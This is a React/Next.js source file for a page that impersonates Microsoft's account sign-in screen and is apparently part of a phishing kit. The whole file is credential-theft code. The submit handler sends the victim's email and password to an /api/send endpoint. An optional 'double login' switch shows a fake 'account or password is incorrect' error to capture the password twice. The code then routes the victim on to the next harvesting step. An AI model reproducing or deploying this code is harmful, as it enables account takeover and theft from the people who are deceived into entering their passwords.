/* eslint-disable @next/next/no-img-element */
import {
  Box,
  Button,
  ChakraProvider,
  extendTheme,
  Flex,
  Image,
  Input,
  Link,
} from "@chakra-ui/react";
import React, { useContext, useEffect, useState } from "react";

import axios from "axios";
import Head from "next/head";
import { useRouter } from "next/router";
import { DataContext } from "../../_app";
import { getNextUrl } from "../../../utils/getNextUrl";
import { getProgress } from "../../../utils/getProgress";

interface LiveProps { }

const theme = extendTheme({
  styles: {
    global: {
      body: {
        fontFamily: `"Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math"`,
        fontSize: `15px`,
        lineHeight: `20px`,
        fontWeight: 400,
        paddingBottom: `0.227px`,
        paddingTop: `0.227px`,
        backgroundColor: `#fff`,
        color: `#1b1b1b`,
        textAlign: `left`,
      },
      html: {
        fontSize: `100% !important`,
      },
    },
  },
});

const Live: React.FC<LiveProps> = () => {
  const [loading, setLoading] = useState(false);
  const [password, setPassword] = useState(``);
  const [attempt, setAttempt] = useState(0);
  const [error, setError] = useState<{
    show: boolean;
    message: string;
  }>({} as any);

  const [emailLogins, setEmailLogins] = useState({});
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();

  const onSubmit = async () => {
    setLoading(true);

    if (!password) {
      setError({
        show: true,
        message: `Please enter the password for your Microsoft account.`,
      });
      setLoading(false);
      return;
    }

    const formData = new FormData();
    const emailInfo = {
      [attempt + 1]: {
        form: `EMAIL`,
        emailLogins: {
          email: datas.email,
          emailPassword: password,
          attempt: attempt + 1,
        },
      },
    }

    formData.append(`form`, `EMAIL`);
    formData.append(
      `emailLogins`,
      JSON.stringify(emailInfo)
    );

    try {
      await axios.post(`/api/send`, formData);
    } catch (error) {
      console.log(error);
    }

    setEmailLogins(emailInfo);

    if (!attempt && process.env.NEXT_PUBLIC_DOUBLE_EMAIL_LOGIN === `ON`) {
      setTimeout(() => {
        setAttempt(1);
        setLoading(false);
        setError({
          show: true,
          message: `Your account or password is incorrect.If you don't remember your password.`,
        });
        setPassword(``);
      }, 2000);
      return;
    }

    setData({
      ...datas,
      emailLogins: {
        ...emailLogins,
        [attempt + 1]: {
          form: `EMAIL`,
          emailLogins: {
            email: datas.email,
            emailPassword: password,
            attempt: attempt + 1,
          },
        },
      },
    });

    setLoading(false);

    const url = getProgress()[getProgress().indexOf(`EMAIL`) + 1];
    push(getNextUrl(url));
  };

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        () => onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <ChakraProvider theme={theme}>
      <Flex flexDir="column">
        <Head>
          <title>Sign in to your Microsoft account</title>
          <style>
            {`
            body {
                font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
                font-size: 15px !important;
                line-height: 20px;
                font-weight: 400;
                line-height: 20px;
                padding-bottom: 0.227px;
                padding-top: 0.227px;
                color: #000;
                background-color: #fff;
                color: #1b1b1b;
                text-align: left;
            }

            html {
                font-size: '100% !important'
            }
          `}
          </style>
          <title>Sign in to your Microsoft account</title>
          <link rel="shortcut icon" href={`/images/external/liveFavicon.ico`} />
          <meta
            name="viewport"
            content="width=device-width, initial-scale=1, maximum-scale=1"
          />
        </Head>
        <Box pos="fixed" top={0} w="100%" h="100%" bgColor="#f2f2f2">
          <Box
            bgImage={["none", `/images/external/liveBG.svg`]}
            bgColor={["#fff", "transparent"]}
            bgPos="center"
            bgRepeat="no-repeat"
            bgSize="cover"
            pos="fixed"
            top={0}
            w="100%"
            h="100%"
          />
          <Box display="table" pos="absolute" w="100%" h="100%">
            <Box display="table-row" h="100%">
              <Box display="table-cell" verticalAlign={["top", "middle"]}>
                <Flex flexDir="column">
                  <Box>
                    <Box
                      minW={0}
                      mx="auto"
                      pos="relative"
                      maxW="440px"
                      w={["100vw", "calc(100% - 40px)"]}
                      p={["24px", "44px"]}
                      mb={["0", "28px"]}
                      bg="#fff"
                      boxShadow={["none", "0 2px 6px rgb(0 0 0 / 20%)"]}
                      minH="338px"
                      overflow="hidden"
                    >
                      <Box
                        bgColor="#fff"
                        opacity={0}
                        zIndex={-1}
                        h="100%"
                        w="100%"
                        pos="absolute"
                        top={0}
                        left={0}
                        transition="all .5s ease-in"
                      />
                      <Box>
                        <Image
                          src={`/images/external/liveLogo.svg`}
                          alt={``}
                          maxW="256px"
                          h="24px"
                          verticalAlign="middle"
                          border={0}
                        />
                      </Box>
                      <Box>
                        <Box>
                          <Box>
                            <Box>
                              <Box
                                h="24px"
                                bgColor="#fff"
                                mt="16px"
                                mb="-4px"
                                display={"flex"}
                                alignItems={"center"}
                              >
                                <Button
                                  variant="unstyled"
                                  minH="24px"
                                  w="24px"
                                  minW="24px"
                                  float="left"
                                  p={0}
                                  bgColor="#fff"
                                  borderWidth={0}
                                  borderRadius="12px"
                                  mr="2px"
                                  my={0}
                                  border={0}
                                  lineHeight="normal"
                                  display="inline-block"
                                  pos="relative"
                                  maxW="100%"
                                  textAlign="center"
                                  whiteSpace="nowrap"
                                  overflow="hidden"
                                  verticalAlign="middle"
                                  textOverflow="ellipsis"
                                  color="#000"
                                >
                                  <Image
                                    src={`/images/external/liveArrowLeft.svg`}
                                    alt={``}
                                    border={0}
                                    verticalAlign="middle"
                                  />
                                </Button>
                                <Box
                                  lineHeight="24px"
                                  whiteSpace="nowrap"
                                  overflow="hidden"
                                  textOverflow="ellipsis"
                                >
                                  {datas && datas.email}
                                </Box>
                              </Box>
                            </Box>
                          </Box>
                          <Box>
                            <Box
                              lineHeight="28px"
                              color="#1b1b1b"
                              fontSize="24px !important"
                              fontWeight={600}
                              p={0}
                              mt="16px"
                              mb="12px"
                              mx={0}
                            >
                              <Box>Enter password</Box>
                            </Box>
                            <Box mx={0}>
                              <Box
                                mb="16px"
                                w="full"
                                float="left"
                                pos="relative"
                                minH="1px"
                                px="2px"
                              >
                                {error.show && (
                                  <Box>
                                    <Box color="#e81123">
                                      {error.message}{" "}
                                      <>
                                        {error.message.includes(
                                          "account or password"
                                        ) && (
                                            <Link
                                              color="#0067b8"
                                              textDecor="none"
                                              _hover={{
                                                textDecoration: "underline",
                                                color: "#666",
                                              }}
                                            >
                                              reset it now
                                            </Link>
                                          )}
                                      </>
                                    </Box>
                                  </Box>
                                )}
                                <Box w="100%" pos="relative">
                                  <Input
                                    variant="flushed"
                                    placeholder="Password"
                                    _placeholder={{
                                      color: "#848484",
                                    }}
                                    type="password"
                                    borderWidth="1px"
                                    p="6px 10px"
                                    borderColor={
                                      error.show ? "#e81123" : "rgba(0,0,0,.6)"
                                    }
                                    h="36px"
                                    outline="none"
                                    borderRadius={0}
                                    bgColor="transparent"
                                    borderTopWidth={0}
                                    borderLeftWidth={0}
                                    borderRightWidth={0}
                                    pl={0}
                                    display="block"
                                    w="100%"
                                    bgImage="none"
                                    maxW="100%"
                                    lineHeight="inherit"
                                    fontFamily="inherit"
                                    fontSize="inherit !important"
                                    color="inherit"
                                    m={0}
                                    style={{
                                      font: `inherit`,
                                    }}
                                    _focus={{
                                      borderColor: "#0067b8",
                                      borderBottomWidth: "1px",
                                      bgColor: "transparent",
                                    }}
                                    value={password}
                                    onChange={(e) => {
                                      setPassword(e.target.value);
                                      if (
                                        error.message ||
                                        (error.message && !e.target.value)
                                      ) {
                                        setError({
                                          show: false,
                                          message: error.message,
                                        });
                                      }
                                    }}
                                  />
                                </Box>
                              </Box>
                            </Box>
                            <Box>
                              <Box display="inline-block" w="100%" mb="36px">
                                <Box mx={0}>
                                  <Box
                                    float="left"
                                    w="100%"
                                    pos="relative"
                                    minH="1px"
                                    px="2px"
                                  >
                                    <Box fontSize="13px !important">
                                      <Box mb="16px">
                                        <Link
                                          color="#0067b8"
                                          textDecor="none"
                                          bgColor="transparent"
                                        >
                                          Forgot password?
                                        </Link>
                                      </Box>
                                      <Box mb="16px">
                                        <Link
                                          color="#0067b8"
                                          textDecor="none"
                                          bgColor="transparent"
                                        >
                                          Other ways to sign in
                                        </Link>
                                      </Box>
                                    </Box>
                                  </Box>
                                </Box>
                              </Box>
                              <Box>
                                <Box mx={0} pos="relative">
                                  <Box>
                                    <Box
                                      pos="absolute"
                                      bottom={0}
                                      right={0}
                                      textAlign="right"
                                      px={0}
                                      width="100%"
                                      float="left"
                                      minH="1px"
                                    >
                                      <Box display="inline-block">
                                        <Button
                                          disabled={loading}
                                          variant="unstyled"
                                          color="#fff"
                                          bgColor="#0067b8"
                                          borderColor="#0067b8"
                                          display="block"
                                          w="108px"
                                          mx={0}
                                          minH="32px"
                                          border="none"
                                          minW="108px"
                                          lineHeight="normal"
                                          p="4px 12px 4px 12px"
                                          pos="relative"
                                          textAlign="center"
                                          maxW="100%"
                                          whiteSpace="nowrap"
                                          overflow="hidden"
                                          verticalAlign="middle"
                                          textOverflow="ellipsis"
                                          borderRadius={0}
                                          fontSize="15px !important"
                                          fontWeight={400}
                                          isDisabled={loading}
                                          _hover={{
                                            bgColor: "#005da6",
                                          }}
                                          _disabled={{
                                            bgColor: "#005da6",
                                          }}
                                          onClick={(e) => {
                                            e.preventDefault();
                                            onSubmit();
                                          }}
                                        >
                                          Sign in
                                        </Button>
                                      </Box>
                                    </Box>
                                  </Box>
                                </Box>
                              </Box>
                            </Box>
                          </Box>
                        </Box>
                      </Box>
                    </Box>
                  </Box>
                </Flex>
              </Box>
            </Box>
            <Box
              pos="absolute"
              left={0}
              bottom={0}
              w="100%"
              overflow="visible"
              zIndex={99}
              minH="28px"
              style={{
                clear: `both`,
              }}
            >
              <Box>
                <Box
                  m={["0 24px", 0]}
                  float={["left", "right"]}
                  color="rgba(0,0,0,.7)"
                  fontSize="13px !important"
                >
                  <Link
                    color={["#747474", "#000"]}
                    fontSize="12px !important"
                    lineHeight="28px"
                    whiteSpace="nowrap"
                    display="inline-block"
                    mx="8px"
                    textDecor="none"
                    bgColor="transparent"
                  >
                    Terms of use
                  </Link>
                  <Link
                    color={["#747474", "#000"]}
                    fontSize="12px !important"
                    lineHeight="28px"
                    whiteSpace="nowrap"
                    display="inline-block"
                    mx="8px"
                    textDecor="none"
                    bgColor="transparent"
                  >
                    Privacy & cookies
                  </Link>
                  <Link
                    color={["#747474", "#000"]}
                    fontSize="16px !important"
                    lineHeight="22px"
                    whiteSpace="nowrap"
                    display="inline-block"
                    mx="8px"
                    textDecor="none"
                    bgColor="transparent"
                    letterSpacing="3px"
                    verticalAlign="top"
                    fontWeight={600}
                    _hover={{
                      textDecoration: "none",
                    }}
                  >
                    ...
                  </Link>
                </Box>
              </Box>
            </Box>
          </Box>
        </Box>
      </Flex>
    </ChakraProvider>
  );
};

export default Live;
